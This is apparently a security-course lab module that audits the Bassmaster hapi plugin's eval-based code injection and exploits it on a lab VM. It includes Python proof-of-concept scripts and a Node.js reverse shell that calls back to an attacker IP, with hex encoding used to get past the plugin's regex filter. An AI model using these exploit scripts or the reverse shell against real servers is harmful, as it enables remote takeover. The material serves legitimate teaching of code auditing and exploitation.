Bassmaster NodeJS Arbitrary JavaScript Injection Vulnerability
This module will cover the in-depth analysis and exploitation of a code injection vulnerability identified in the Bassmaster plugin that can be used to gain access to the underlying operating system. We will also discuss ways in which you can audit server-side JavaScript code for critical vulnerabilities such as these.

17.1. Getting Started
Revert the Bassmaster VM from the Labs page. You can log in to the Bassmaster VM using the following credentials:

Username	Password
student	studentlab
Table 1 - Virtual Machine credentials

To start the NodeJS web server we'll login to the Bassmaster VM via ssh and issue the following command from the terminal:

student@bassmaster:~$ cd bassmaster/

student@bassmaster:~/bassmaster$ nodejs examples/batch.js
Server started.
Listing 1 - Starting the NodeJS server.

When the server starts up, an endpoint will be made available at the following URL:

http://bassmaster:8080/request
Listing 2 - Bassmaster URL

17.2. The Bassmaster Plugin
In recent years our online experiences have, for better or worse, evolved with the advent of various JavaScript frameworks and libraries built to run on top of Node.js.1 As described by its developers, Node.js is "...an asynchronous event driven JavaScript runtime...", which means that it is capable of handling multiple requests, without the use of "thread-based networking".2 We encourage you to read more about Node.js, but for the purposes of this module, we are interested in a plugin called Bassmaster3 that was developed for the hapi4 framework, which runs on Node.js.

In essence, Bassmaster is a batch processing plugin that can combine multiple requests into a single one and pass them on for further processing. The version of the plugin installed on your virtual machine is vulnerable to JavaScript code injection, which results in server-side remote code execution.

Although modern web application scanners can detect a wide variety of vulnerabilities with escalating complexity, Node.js-based applications still present a somewhat difficult vulnerability discovery challenge. Nevertheless, in the example we will discuss in this module, we are able to audit the source code, which will help us discover and analyze a critical remote code execution vulnerability as well as sharpen our code auditing skills.

The most interesting aspect of this particular vulnerability is that it directly leads to server-side code execution. In a more typical situation, JavaScript code injections are usually found on the client-side attack surface and involve arguably less critical vulnerability classes such as Cross-Site Scripting.

1
(OpenJS Foundation, 2020), https://nodejs.org/en/ ↩︎

2
(OpenJS Foundation, 2020), https://nodejs.org/en/about/ ↩︎

3
(Eran Hammer, 2018), https://github.com/hapijs/bassmaster ↩︎

4
(Sideway Inc., 2020), https://hapijs.com/ ↩︎

17.3. Vulnerability Discovery
Given the fact that Bassmaster is designed as a server-side plugin and that we have access to the source code, one of the first things we want to do is parse the code for any low-hanging fruit. In the case of JavaScript, a search for the eval1 function should be on top of that list, as it allows the user to execute arbitrary code. If eval is available AND reachable with user-controlled input, that could lead to remote code execution.

With the above in mind, let's determine what we are dealing with.

student@bassmaster:~/bassmaster$ grep -rnw  "eval(" . --color
./lib/batch.js:152:                    eval('value = ref.' + parts[i].value + ';');
./node_modules/sinon/lib/sinon/spy.js:77:                eval("p = (function proxy(" + vars.substring(0, proxyLength * 2 - 1) + // eslint-disable-line no-eval
./node_modules/sinon/pkg/sinon-1.17.6.js:2543:                eval("p = (function proxy(" + vars.substring(0, proxyLength * 2 - 1) + // eslint-disable-line no-eval
./node_modules/sinon/pkg/sinon.js:2543:                eval("p = (function proxy(" + vars.substring(0, proxyLength * 2 - 1) + // eslint-disable-line no-eval
./node_modules/lab/node_modules/esprima/test/test.js:17210:        'function eval() { }': {
...
student@bassmaster:~/bassmaster$
Listing 3 - Searching the Bassmaster code base for the use of eval() function

In Listing 3, the very first result points us to the lib/batch.js file, which looks like a very good spot to begin our investigation.

Beginning on line 137 of lib/batch.js, we find the implementation of a function called internals.batch that accepts a parameter called parts, among others. This parameter array is then used in the eval function call on line 152.

137: internals.batch = function (batchRequest, resultsData, pos, parts, callback) {
138: 
139:     var path = '';
140:     var error = null;
141: 
142:     for (var i = 0, il = parts.length; i < il; ++i) {
143:         path += '/';
144: 
145:         if (parts[i].type === 'ref') {
146:             var ref = resultsData.resultsMap[parts[i].index];
147: 
148:             if (ref) {
149:                 var value = null;
150: 
151:                 try {
152:                     eval('value = ref.' + parts[i].value + ';');
153:                 }
Listing 4 - An instance of the eval() function usage in batch.js

In order to reach that point, we need to make sure that the type of at least one of the parts array entries is "ref". Notice that if there is no entry of type "ref", we will drop down to the if statement on line 182, which we should pass as the error variable is initialized to null. This in turn leads us to the internals.dispatch function on line 186. We won't show the implementation of this function since it simply makes another HTTP request on our behalf, which should pull the next request from the initial batch, but we encourage you to see that for yourself in the source code.

154:                 catch (e) {
155:                     error = new Error(e.message);
156:                 }
157: 
158:                 if (value) {
159:                     if (value.match && value.match(/^[\w:]+$/)) {
160:                         path += value;
161:                     }
162:                     else {
163:                         error = new Error('Reference value includes illegal characters');
164:                         break;
165:                     }
166:                 }
167:                 else {
168:                     error = error || new Error('Reference not found');
169:                     break;
170:                 }
171:             }
172:             else {
173:                 error = new Error('Missing reference response');
174:                 break;
175:             }
176:         }
177:         else {
178:             path += parts[i].value;
179:         }
180:     }
181: 
182:     if (error === null) {
183: 
184:         // Make request
185:         batchRequest.payload.requests[pos].path = path;
186:         internals.dispatch(batchRequest, batchRequest.payload.requests[pos], function (data) {
Listing 5 - Internals.dispatch performs additional HTTP requests on our behalf

The important part is on lines 194-195 or 202-203, where the resultsData array entries get populated based on the HTTP response from the previous request. Ultimately, this will allow us to pass the check for "ref" on line 148, which is based on data from the resultsData array, and we will arrive at our target, back on line 152 where the eval is performed.

187: 
188:             // If redirection
189:             if (('' + data.statusCode).indexOf('3')  === 0) {
190:                 batchRequest.payload.requests[pos].path = data.headers.location;
191:                 internals.dispatch(batchRequest, batchRequest.payload.requests[pos], function (data) {
192:                     var result = data.result;
193: 
194:                     resultsData.results[pos] = result;
195:                     resultsData.resultsMap[pos] = result;
196:                     callback(null, result);
197:                 });
198:                 return;
199:             }
200: 
201:             var result = data.result;
202:             resultsData.results[pos] = result;
203:             resultsData.resultsMap[pos] = result;
204:             callback(null, result);
205:         });
206:     }
207:     else {
208:         resultsData.results[pos] = error;
209:         return callback(error);
210:     }
211: };
Listing 6 - resultsData array is populated with the HTTP request results

Since eval executes the code passed as a string parameter, its use is highly discouraged when the input is user-controlled. Notice that in this case, the eval function executes code that is composed of hardcoded strings as well as the parts array entries. This looks like a promising lead, so we need to trace back the code execution path and see if we control the contents of the parts array at any point.

Looking through the rest of the lib/batch.js file, we find that our internals.batch function is called on line 88 (Listing 7) from the internal.process function that has a couple of relevant parts we need to highlight.

First of all, a callback function called callBatch is defined on line 85 and makes a call to the internals.batch function on line 88. Notice that the second argument of the callBatch function (called parts) is simply passed to the internals.batch function as the fourth argument. This is the one we can hopefully control, so we need to keep a track of it.

081: internals.process = function (request, requests, resultsData, reply) {
082: 
083:     var fnsParallel = [];
084:     var fnsSerial = [];
085:     var callBatch = function (pos, parts) {
086: 
087:         return function (callback) {
088:             internals.batch(request, resultsData, pos, parts, callback);
089:         };
090:     };
Listing 7 - The process function

Then on lines 92-101, we see the arrays fnsParallel and fnsSerial populated with the callBatch function. Finally, these arrays are passed on to the Async.series function starting on line 103, where they will trigger the execution of the callBatch function.

091: 
092:     for (var i = 0, il = requests.length; i < il; ++i) {
093:         var parts = requests[i];
094: 
095:         if (internals.hasRefPart(parts)) {
096:             fnsSerial.push(callBatch(i, parts));
097:         }
098:         else {
099:             fnsParallel.push(callBatch(i, parts));
100:         }
101:     }
102: 
103:     Async.series([
104:         function (callback) {
105: 
106:             Async.parallel(fnsParallel, callback);
107:         },
108:         function (callback) {
109: 
110:             Async.series(fnsSerial, callback);
111:         }
112:     ], function (err) {
113: 
114:         if (err) {
115:             reply(err);
116:         }
117:         else {
118:             reply(resultsData.results);
119:         }
120:     });
121: };
Listing 8 - The remainder of the process function

The most important part of this logic to understand is that the callBatch function calls on lines 96 and 99 use a variable called parts that is populated from the requests array, which is passed to the internals.process function as the second argument. This is now the argument we need to continue keeping track of.

The next step in our tracing exercise is to find out where the internals.process function is called from. Once again, if we look through the lib/batch.js file, we can find the function call we are looking for on line 69.

12: module.exports.config = function (settings) {
13: 
14:     return {
15:         handler: function (request, reply) {
16: 
17:             var resultsData = {
18:                 results: [],
19:                 resultsMap: []
20:             };
21: 
22:             var requests = [];
23:             var requestRegex = /(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g;       // /project/$1.project/tasks, does not allow using array responses
24: 
25:             // Validate requests
26: 
27:             var errorMessage = null;
28:             var parseRequest = function ($0, $1, $2) {
29: 
30:                 if ($1) {
31:                     if ($1 < i) {
32:                         parts.push({ type: 'ref', index: $1, value: $2 });
33:                         return '';
34:                     }
35:                     else {
36:                         errorMessage = 'Request reference is beyond array size: ' + i;
37:                         return $0;
38:                     }
39:                 }
40:                 else {
41:                     parts.push({ type: 'text', value: $2 });
42:                     return '';
43:                 }
44:             };
45: 
46:             if (!request.payload.requests) {
47:                 return reply(Boom.badRequest('Request missing requests array'));
48:             }
49: 
50:             for (var i = 0, il = request.payload.requests.length; i < il; ++i) {
51: 
52:                 // Break into parts
53: 
54:                 var parts = [];
55:                 var result = request.payload.requests[i].path.replace(requestRegex, parseRequest);
56: 
57:                 // Make sure entire string was processed (empty)
58: 
59:                 if (result === '') {
60:                     requests.push(parts);
61:                 }
62:                 else {
63:                     errorMessage = errorMessage || 'Invalid request format in item: ' + i;
64:                     break;
65:                 }
66:             }
67: 
68:             if (errorMessage === null) {
69:                 internals.process(request, requests, resultsData, reply);
70:             }
71:             else {
72:                 reply(Boom.badRequest(errorMessage));
73:             }
74:         },
75:         description: settings.description,
76:         tags: settings.tags
77:     };
78: };
Listing 9 - Batch.config function

We will start analyzing the code listed above from the beginning and see how we can reach our internals.process function call. First, the resultsData hash map is set with results and resultsMap as arrays within the map (line 17). Following that, the URL path part of a requests array entry in the request variable is parsed and split into parts (line 55) after being processed using the regular expression that is defined on line 23. This is an important restriction we will need to deal with.

The code execution logic in this case is somewhat difficult to follow if you are not familiar with JavaScript, so we will break it down even more. Specifically, the string replace function in JavaScript can accept a regular expression as the first parameter and a function as the second. In that case, the string on which the replace function is operating (in this instance a part of the URL path), will first be processed through the regular expression. As a result, this operation returns a number of parameters, which are then passed to the function that was passed as the second parameter. Finally, the function itself executes and the code execution proceeds in a more clear manner. If this explanation still leaves you scratching your head, we recommend that you read the String.prototype.replace documentation.2

Notice that the parseRequest function is ultimately responsible for setting the part type to "ref", which is what we will need to reach our eval instance as we previously described. As a result of the implemented logic, the parts array defined on line 54 is populated in the parseRequest function on lines 32 and 41. Ultimately, the parts array becomes an entry in the requests array on line 60. If no errors occur during this step, the internals.process function is called with the requests variable passed as the second parameter.

The analysis of this code chunk shows us that if we can control the URL paths that are passed to lib/batch.js for processing, we should be able to reach our eval function call with user-controlled data. But first, we need to find out where the module.exports.config function that we looked at in Listing 9 is called from. That search leads us to the lib/index.js file.

01:  // Load modules
02: 
03: var Hoek = require('hoek');
04: var Batch = require('./batch');
05: 
06: 
07: // Declare internals
08: 
09: var internals = {
10:     defaults: {
11:         batchEndpoint: '/batch',
12:         description: 'A batch endpoint that makes it easy to combine multiple requests to other endpoints in a single call.',
13:         tags: ['bassmaster']
14:     }
15: };
16: 
17: 
18: exports.register = function (pack, options, next) {
19: 
20:     var settings = Hoek.applyToDefaults(internals.defaults, options);
21: 
22:     pack.route({
23:         method: 'POST',
24:         path: settings.batchEndpoint,
25:         config: Batch.config(settings)
26:     });
27: 
28:     next();
29: };
Listing 10 - The /batch endpoint defined in lib/index.js

The source code in the listing above shows that the /batch endpoint handles requests through the config function defined in the bassmaster/lib/batch.js file. This means that properly formatted requests made to this endpoint will eventually reach our eval target!

So how do we create a properly formatted request for this endpoint? Fortunately, the Bassmaster plugin comes with an example file (examples/batch.js) that tells us exactly what we need to know.

11: /**
12:  * To Test:
13:  *
14:  * Run the server and try a batch request like the following:
15:  *
16:  * POST /batch
17:  *     { "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }]
18:  *
19:  * or a GET request to http://localhost:8080/request will perform the above request for you
20:  */
21: 
...
49: 
50: internals.requestBatch = function (request, reply) {
51: 
52:     internals.http.inject({
53:         method: 'POST',
54:         url: '/batch',
55:         payload: '{ "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }] }'
56:     }, function (res) {
57: 
58:         reply(res.result);
59:     });
60: };
61: 
62: 
63: internals.main = function () {
64: 
65:     internals.http = new Hapi.Server(8080);
66: 
67:     internals.http.route([
68:         { method: 'GET', path: '/profile', handler: internals.profile },
69:         { method: 'GET', path: '/item', handler: internals.activeItem },
70:         { method: 'GET', path: '/item/{id}', handler: internals.item },
71:         { method: 'GET', path: '/request', handler: internals.requestBatch }
72:     ]);
73: 
Listing 11 - Bassmaster example code

Specifically, we can see in the listing above that the example code clearly defines two ways to reach the batch processing function. The first one is an indirect path through a GET request to the /request route, as seen on lines 71. The second one is a direct JSON3 POST request to the /batch internal endpoint on line 53.

With that said, we can use the following simple Python script to send an exact copy of the example request:

import requests,sys

if len(sys.argv) != 2:
    print "(+) usage: %s <target>" % sys.argv[0]
    sys.exit(-1)
    
target = "http://%s:8080/batch" % sys.argv[1]

request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'
request_3 = '{"method":"get","path":"/item/$1.id"}'

json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)

r = requests.post(target, json)

print r.text
Listing 12 - A script to send the request based on the comments in ~/bassmaster/examples/batch.js

Once we start the Node.js runtime with the bassmaster example file, we can execute our script. If everything is working as expected, we should receive a response like the following:

kali@kali:~/bassmaster$ python bassmaster_valid.py bassmaster
[{"id":"fa0dbda9b1b","name":"John Doe"},{"id":"55cf687663","name":"Active Item"},{"id":"55cf687663","name":"Item"}]
Listing 13 - The expected response to a valid POST submission to /batch on the bassmaster server

At this point, we can start thinking about how our malicious request should look in order to reach the eval function we are targeting.

1
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval ↩︎

2
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Specifying_a_function_as_a_parameter ↩︎

3
(The JSON Data Interchange Standard, 2020), https://www.json.org/ ↩︎

17.4. Triggering the Vulnerability
It turns out that the only "sanitization" on our JSON request is done through the regular expression we mentioned in the previous section that checks for a valid item format. As a quick reminder, the regular expression looks like this:

/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g
Listing 14 - The regular expression to match

An easy way to decipher and understand regular expressions is to use one of the few public websites1 that provide a regular expression testing environment. In this case, we will use a known valid string from our original payload with a small modification.

Figure 1: Finding a string that will match the second group
Figure 1: Finding a string that will match the second group
As we can see, the forward slashes are essentially used as a string separator and the strings between the slashes are then grouped using the dot character as a separator, but only if the $d. pattern is matched.

In Figure 1, we attempted to inject the string ";hacked" into the original payload and managed to pass the regular expression test. Since the ";" character terminates a statement in JavaScript, we should now be able to append code to the original instruction and see if we can execute it! As a proof of concept, we can use the NodeJS util module's log method to write a message to the console.2 First, let's double check that this would work with our regular expression.

Figure 2: The payload works with the regular expression
Figure 2: The payload works with the regular expression
In Figure 2 our entire payload is grouped within Group 2, which means that we should reach the eval function and our payload should execute. Let's add this to our script and see if we get any output.

The following proof of concept can do that for us. It builds the JSON payload and appends the code of our choice to the last request entry.

import requests,sys

if len(sys.argv) != 3:
    print "(+) usage: %s <target> <cmd_injection>" % sys.argv[0]
    sys.exit(-1)
    
target = "http://%s:8080/batch" % sys.argv[1]

cmd = sys.argv[2]

request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % cmd

json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)

r = requests.post(target, json)

print r.content
Listing 15 - Proof of concept that injects JavaScript code into the server-side eval instruction

In the following instance, we are going to use a simple log function as our payload and try to get it to execute on our target server.

kali@kali:~/bassmaster$ python bassmaster_cmd.py bassmaster "require('util').log('CODE_EXECUTION');"
[{"id":"fa0dbda9b1b","name":"John Doe"},{"id":"55cf687663","name":"Active Item"},{"id":"55cf687663","name":"Item"}]
Listing 16 - Injecting Javascript code

Figure 3: Our web console shows that we have been hacked!
Figure 3: Our web console shows that we have been hacked!
Great! As shown in Figure 3 we can execute arbitrary JavaScript code on the server. Notice that the regular expression is not really sanitizing the input. It is simply making sure that the format of the user-provided URL path is correct.

A log message isn't exactly our goal though. Ideally, we want to get a remote shell on the server. So let's see if we can take our attack that far.

1
(Regex 101, 2020), https://regex101.com/ ↩︎

2
(OpenJS Foundation, 2020), https://nodejs.org/api/util.html#util_util_log_string ↩︎

17.5. Obtaining a Reverse Shell
Now that we have demonstrated how to remotely execute arbitrary code using this Bassmaster vulnerability, we only need to inject a Javascript reverse shell into our JSON payload to wrap up our attack. However, there is one small problem we will need to deal with. Let's first take a look at the following Node.js reverse shell that can be found online:1

var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
Listing 17 - Node.js reverse shell

While the code in the listing above is more or less self-explanatory in that it redirects the input and output streams to the established socket, the only item worth pointing out is that it is doing so using the Node.js net module.

We update our previous proof of concept by including the reverse shell from Listing 17. The code accepts an IP address and a port as command line arguments to properly set up a network connection between the server and the attacking machine.

import requests,sys

if len(sys.argv) != 4:
    print "(+) usage: %s <target> <attacking ip address> <attacking port>" % sys.argv[0]
    sys.exit(-1)
    
target = "http://%s:8080/batch" % sys.argv[1]

cmd = "//bin//bash"

attackerip = sys.argv[2]
attackerport = sys.argv[3]

request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'

shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % cmd
shell += 'var client = new net.Socket(); '
shell += 'client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip)
shell += 'sh.stderr.pipe(client);});' 

request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell

json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)

r = requests.post(target, json)

print r.content
Listing 18 - Proof of concept reverse shell script

If we execute this script after setting up a netcat listener on our Kali VM, we should receive a reverse shell. However, the following listing shows that this does not happen.

kali@kali:~/bassmaster$ python bassmaster_shell.py bassmaster 192.168.119.120 5555
{"statusCode":500,"error":"Internal Server Error","message":"An internal server error occurred"}
Listing 19 - Initial attempt to gain a reverse shell fails

Since our exploit has clearly failed, we need to figure out where things went wrong. To do that, we can slightly modify the lib/batch.js file on the target server and add a single debugging statement right before the eval function call. Specifically, we want to see what exactly is being passed to the eval function for execution. The new code should look like this:

...
            if (ref) {
                var value = null;

                try {
                    console.log('Executing: ' + parts[i].value);
                    eval('value = ref.' + parts[i].value + ';');
                }
                catch (e) {
...
Listing 20 - Debugging code execution

If we now execute our reverse shellcode injection script, we can see the following output in the server terminal window:

Figure 4: Debugging a failed attempt to get a reverse shell
Figure 4: Debugging a failed attempt to get a reverse shell
That certainly does not look like our complete code injection! It appears that our payload is getting truncated at the first forward slash. However, if you recall how the regular expression that filters our input works, this result actually makes sense. Let's submit our whole payload to the regex checker and see how exactly the parsing takes place.

Figure 5: Regex checker ran against the Node.js reverse shell
Figure 5: Regex checker ran against the Node.js reverse shell
We can clearly see that the regular expression is explicitly looking for the forward slashes and groups the input accordingly. Again, this makes sense as the inputs the Bassmaster plugin expects are actually URL paths.

Since our payload contains forward slashes ("/bin/bash") it gets truncated by the regex. This means that we need to figure out how to overcome this character restriction. Fortunately, JavaScript strings can by design be composed of hex-encoded characters, in addition to other encodings. So we should be able to hex-encode our forward slashes and bypass the restrictions of the regex parsing. The following proof of concepts applies the hex-encoding scheme to the cmd string.

import requests,sys

if len(sys.argv) != 4:
    print "(+) usage: %s <target> <attacking ip address> <attacking port>" % sys.argv[0]
    sys.exit(-1)
    
target = "http://%s:8080/batch" % sys.argv[1]

cmd = "\\\\x2fbin\\\\x2fbash"

attackerip = sys.argv[2]
attackerport = sys.argv[3]

request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'

shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % cmd
shell += 'var client = new net.Socket(); '
shell += 'client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip)
shell += 'sh.stderr.pipe(client);});' 

request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell

json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)

r = requests.post(target, json)

print r.content
Listing 21 - Avoiding character restrictions via hex encoding

All that is left to do now is test our new payload. We'll set up the netcat listener on our Kali VM and pass the IP and port as arguments to our script.

Figure 6: Bassmaster code injection results in a reverse shell
Figure 6: Bassmaster code injection results in a reverse shell
Excellent! Our character restriction evasion worked and we were able to receive a reverse shell!

Exercise
Repeat the steps outlined in this module and obtain a reverse shell.

Extra Mile
The student user home directory contains a sub-directory named bassmaster_extramile. In this directory we slightly modified the Bassmaster original code to harden the exploitation of the vulnerability covered in this module.

Launch the NodeJS batch.js example server from the extra mile directory and exploit the eval code injection vulnerability overcoming the new restrictions in place.

student@bassmaster:~$ cd bassmaster_extramile/

student@bassmaster:~/bassmaster_extramile$ nodejs examples/batch.js
Server started.
Listing 22 - Starting the extra mile NodeJS server

1
(Riyaz Walikar, 2016), https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/ ↩︎

